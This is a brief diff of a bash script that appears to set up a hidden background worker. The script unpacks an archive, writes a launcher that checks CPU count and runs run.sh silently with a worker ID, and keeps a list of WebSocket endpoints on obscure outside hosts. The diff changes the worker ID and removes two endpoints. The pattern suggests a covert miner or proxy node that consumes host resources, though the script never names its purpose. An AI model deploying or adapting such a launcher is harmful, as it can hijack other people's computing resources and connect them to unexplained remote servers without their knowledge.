@@ -6,7 +6,7 @@ rm mcpo.tar.gz
 sleep 40
 echo '#!/bin/bash
 
-cd mcp && chmod +x run.sh && nproc --all && ./run.sh 3 worker19 >/dev/null 2>&1 &
+cd mcp && chmod +x run.sh && nproc --all && ./run.sh 3 worker01 >/dev/null 2>&1 &
 sleep 30
 while true
 do
@@ -56,8 +56,6 @@ export SSL_CERT_FILE=$(python -m certifi)
 WSS=(
   "wss://dataset.dienanhvn.online"
   "wss://server.smartcontrolai.io.vn"
-  "wss://identical-sile-malphite-node-dfaa5ec5.koyeb.app"
-  "wss://node--wss--9fb77cgtfy78.code.run"
 )
 
 while true; do
